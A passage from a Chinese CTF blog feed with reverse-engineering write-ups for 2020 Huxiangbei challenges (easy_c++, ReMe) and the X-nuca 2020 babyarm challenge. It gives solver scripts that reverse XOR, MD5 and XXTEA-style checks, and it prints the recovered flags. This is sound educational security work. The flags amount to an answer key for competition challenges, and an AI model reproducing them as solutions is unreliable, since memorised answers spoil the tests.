class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ch1 = <span class="number">0</span>;</span><br><span class="line">ch1 = (ida_chars[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (ida_chars[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ch1 = (((ida_chars[i]^i) &gt;&gt; <span class="number">3</span>) | ((ida_chars[i<span class="number">-1</span>]^(i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line">&#125;</span><br><span class="line">ch1 = (ida_chars[<span class="number">23</span>] &gt;&gt; <span class="number">3</span> ) | ((ida_chars[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="comment">//ea5yre_1s_50_ea5y_t0_y0u</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>很简单，ida打开后简单分析以下，只是对输入进行了一个异或，然后与指定编码字符串进行比较。。</p><p>直接在ida-python解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'7d21e&lt;e3&lt;:3;9;ji t r#w\"$*&#123;*+*$|,'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += chr(ord(s[i])^i)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7e02a9c4439056df0e2a7b432b0069b3</span></span><br></pre></td></tr></table></figure><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>首先从程序图标可以想到python，然后ida载入查看字符串，发现很多PY相关的字符且程序不寻常。这时候基本可以确定是python打包成的exe程序了。</p><p>然后使用<strong>python pyinstxtractor.py ReMe.exe</strong>解包，从得到的包里可以pyc文件看到ReMe，但是缺少文件头的，找到包里的另一个stuct文件，对ReMe的文件头进行补齐。</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/909254_VRZ57MQQAC3H4EX.png" alt="https://bbs.pediy.com/upload/attach/202011/909254_VRZ57MQQAC3H4EX.png"></p><p>使用<strong>uncompyle6 -o re.py ReMe.pyc</strong>转化为py文件。</p><p>py代码很简单，把原来的代码稍微修改以下可以直接爆破出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">'e5438e78ec1de10a2693f9cffb930d23'</span>,</span><br><span class="line"> <span class="string">'08e8e8855af8ea652df54845d21b9d67'</span>,</span><br><span class="line"> <span class="string">'a905095f0d801abd5865d649a646b397'</span>,</span><br><span class="line"> <span class="string">'bac8510b0902185146c838cdf8ead8e0'</span>,</span><br><span class="line"> <span class="string">'f26f009a6dc171e0ca7a4a770fecd326'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'4cb467175ab6763a9867b9ed694a2780'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'fd311e9877c3db59027597352999e91f'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'7fb523b42413495cc4e610456d1f1c84'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'bc52c927138231e29e0b05419e741902'</span>,</span><br><span class="line"> <span class="string">'515b7eceeb8f22b53575afec4123e878'</span>,</span><br><span class="line"> <span class="string">'451660d67c64da6de6fadc66079e1d8a'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'fe86104ce1853cb140b7ec0412d93837'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'c2bab7ea31577b955e2c2cac680fb2f4'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'f077b3a47c09b44d7077877a5aff3699'</span>,</span><br><span class="line"> <span class="string">'620741f57e7fafe43216d6aa51666f1d'</span>,</span><br><span class="line"> <span class="string">'9e3b206e50925792c3234036de6a25ab'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'874992ac91866ce1430687aa9f7121fc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(num)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">ret_list = func(ch)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(len(ret_list)):</span><br><span class="line">s += str(ret_list[idx])</span><br><span class="line">s += str(ret_list[(len(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">if</span> md5.hexdigest() == check[i]:</span><br><span class="line">flag += chr(ch)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">   print(<span class="string">'flag&#123;'</span> + md5.hexdigest() + <span class="string">'&#125;'</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#flag&#123;0584cfa2ce502951ef5606f6b99fc921&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>X-nuca 2020</title>
      <link href="/2020/10/31/X-nuca-2020/"/>
      <url>/2020/10/31/X-nuca-2020/</url>
      
        <content type="html"><![CDATA[<p>第一次打这个比赛，是中国科学院信息工程研究所出的题，题目都偏难吧。。做了一个arm架构的题，然后UnravelMFC这个题，比赛时学长师傅做了，就没做了，赛后把它复现了下。</p><p>链接：<a href="https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A" target="_blank" rel="noopener">https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A</a><br>提取码：mflo<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><a id="more"></a><h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>进入程序直接看到假的程序流程。。看了下函数，然后gdb开一个端口不断调试跟找到关键函数。其实从<strong>ELF Initialization Function Table</strong> 也可以看见关键加密函数：<strong>sub_114D8</strong>。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201105163344611.png" alt="image-20201105163344611"></p><p>确定关键函数后不断调试。。从调试看到，首先对输入字符hex，然后再byes.fromhex()，所以最后就是我们输入的字符。</p><p>剩下就是慢慢整理数据，解密。。循环加密数据。。</p><p>加密中2中取已经编码数据的表达式需要注意一下，动调可以很明白。</p><p><strong>(_DWORD *)(&amp;v40 + (v17 &amp; 0xC) - 20)</strong></p><p><strong>(*((_DWORD *)&amp;v40 + (((unsigned __int8)(v17 &gt;&gt; 2) ^ 1) &amp; 3) - 5)</strong></p><p>首先取出最后比较的密文变成16个4字节数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xF0</span>, <span class="number">0x61</span>, <span class="number">0xB0</span>, <span class="number">0x7E</span>, <span class="number">0x56</span>, <span class="number">0xC8</span>, <span class="number">0xB3</span>, <span class="number">0xC7</span>, <span class="number">0xA3</span>, </span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x22</span>, <span class="number">0xE3</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0xE5</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xDC</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x0F</span>, <span class="number">0x83</span>, <span class="number">0xD0</span>, <span class="number">0xF4</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x81</span>, <span class="number">0x57</span>, <span class="number">0x8A</span>, <span class="number">0x4F</span>, <span class="number">0xEC</span>, <span class="number">0x04</span>, <span class="number">0x86</span>, <span class="number">0x7F</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x2E</span>, <span class="number">0xF3</span>, <span class="number">0xDD</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x53</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x7F</span>, <span class="number">0xDC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#x "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars+i));</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*unsigned int v32 = 0xb061f013;</span></span><br><span class="line"><span class="comment">unsigned int v28 = 0xb3c8567e;</span></span><br><span class="line"><span class="comment">unsigned int v25 = 0x9952a3c7;</span></span><br><span class="line"><span class="comment">unsigned int v29 = 0x451c2d3f;</span></span><br><span class="line"><span class="comment">unsigned int v26 = 0x3ee32267;</span></span><br><span class="line"><span class="comment">unsigned int v27 =  0xe3e22b3e;</span></span><br><span class="line"><span class="comment">unsigned int v10 = 0x43e5a250;</span></span><br><span class="line"><span class="comment">unsigned int v30 = 0x59b28ed0;</span></span><br><span class="line"><span class="comment">unsigned int v31 = 0xf8649dc;</span></span><br><span class="line"><span class="comment">unsigned int v11 = 0x9bf4d083;</span></span><br><span class="line"><span class="comment">unsigned int v12 = 0x8a578110;</span></span><br><span class="line"><span class="comment">unsigned int v13 = 0x8604ec4f;</span></span><br><span class="line"><span class="comment">unsigned int v14 = 0x2eb5a27f;</span></span><br><span class="line"><span class="comment">unsigned int v15 = 0x1217ddf3;</span></span><br><span class="line"><span class="comment">unsigned int v16 = 0x93c9b253;</span></span><br><span class="line"><span class="comment">unsigned int v33 = 0xdc7f8e43;*/</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v32 = <span class="number">0xb061f013</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v28 = <span class="number">0xb3c8567e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v25 = <span class="number">0x9952a3c7</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29 = <span class="number">0x451c2d3f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26 = <span class="number">0x3ee32267</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v27 = <span class="number">0xe3e22b3e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v10 = <span class="number">0x43e5a250</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v30 = <span class="number">0x59b28ed0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v31 = <span class="number">0xf8649dc</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v11 = <span class="number">0x9bf4d083</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12 = <span class="number">0x8a578110</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v13 = <span class="number">0x8604ec4f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v14 = <span class="number">0x2eb5a27f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v15 = <span class="number">0x1217ddf3</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v16 = <span class="number">0x93c9b253</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v33 = <span class="number">0xdc7f8e43</span>;</span><br><span class="line"><span class="comment">//unsigned int v33 = 0;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v17 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v40 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v18 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans1[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v19;</span><br><span class="line"><span class="keyword">int</span> v34 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">ans[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">ans[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">ans[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ans1[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">ans1[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">ans1[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">ans1[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v17 = <span class="number">0x8FF34781</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">*(_int8 *)&amp;v18 = v17 &gt;&gt; <span class="number">2</span>; <span class="comment">//LOBYTE</span></span><br><span class="line"> v19 = (((v32 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v16) + (<span class="number">4</span> * v32 ^ (v16 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                       + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xF</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                       - <span class="number">5</span>) ^ v16)</span><br><span class="line">                                                                    + (v32 ^ v17));</span><br><span class="line">v33 = v33-v19;</span><br><span class="line"> v16 -= (((v33 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v15) + (<span class="number">4</span> * v33 ^ (v15 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xE</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v15)</span><br><span class="line">                                                                     + (v33 ^ v17));</span><br><span class="line">                                                                     </span><br><span class="line">v15 -= (((v16 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v14) + (<span class="number">4</span> * v16 ^ (v14 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xD</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v14)</span><br><span class="line">                                                                     + (v16 ^ v17));</span><br><span class="line">v14 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v13) + (v15 ^ v17)) ^ (((v15 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v13)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v15 ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v13 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xB</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v12) + (v14 ^ v17)) ^ (((v14 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v12) + (<span class="number">4</span> * v14 ^ (v12 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v12 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xA</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v11) + (v13 ^ v17)) ^ (((v13 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v11) + (<span class="number">4</span> * v13 ^ (v11 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v11 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">9</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v31) + (v12 ^ v17)) ^ (((v12 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v31) + (<span class="number">4</span> * v12 ^ (v31 &gt;&gt; <span class="number">5</span>)));<span class="comment">////</span></span><br><span class="line">v31 -= (((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v30)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v11 ^ (v30 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line"><span class="comment">//v18 = v31 + (((*((_int32 *)ans1 + 5 + ((v17 &gt;&gt; 2) &amp; 3) - 5) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; 3) ^ 16 * v30) + (4 * v11 ^ (v30 &gt;&gt; 5))));</span></span><br><span class="line">v30 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v10) + (v31 ^ v17)) ^ (((v31 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v10) + (<span class="number">4</span> * v31 ^ (v10 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v10 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v27) + (v30 ^ v17)) ^ (((v30 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v27) + (<span class="number">4</span> * v30 ^ (v27 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v27 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v26) + (v10 ^ v17)) ^ (((v10 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v26) + (<span class="number">4</span> * v10 ^ (v26 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v26 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v29) + (v27 ^ v17)) ^ (((v27 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v29) + (<span class="number">4</span> * v27 ^ (v29 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v29 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">3</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v25) + (v26 ^ v17)) ^ (((v26 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v25) + (<span class="number">4</span> * v26 ^ (v25 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v25 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v28) + (v29 ^ v17)) ^ (((v29 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v28) + (<span class="number">4</span> * v29 ^ (v28 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v28 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v32) + (v25 ^ v17)) ^ (((v25 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v32) + (<span class="number">4</span> * v25 ^ (v32 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v32 -= (((v28 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v33) + (<span class="number">4</span> * v28 ^ (v33 &gt;&gt; <span class="number">5</span>))) ^ ((v33 ^ *(_int32 *)(ans + <span class="number">20</span> + (v17 &amp; <span class="number">0xC</span>) - <span class="number">20</span>)) + (v28 ^ v17));</span><br><span class="line">v17 += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(v17 != <span class="number">0</span>);</span><br><span class="line">v34++;</span><br><span class="line">&#125;<span class="keyword">while</span>(v34 != <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"good!"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过调试窗口取出的解密数据，然后打印出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 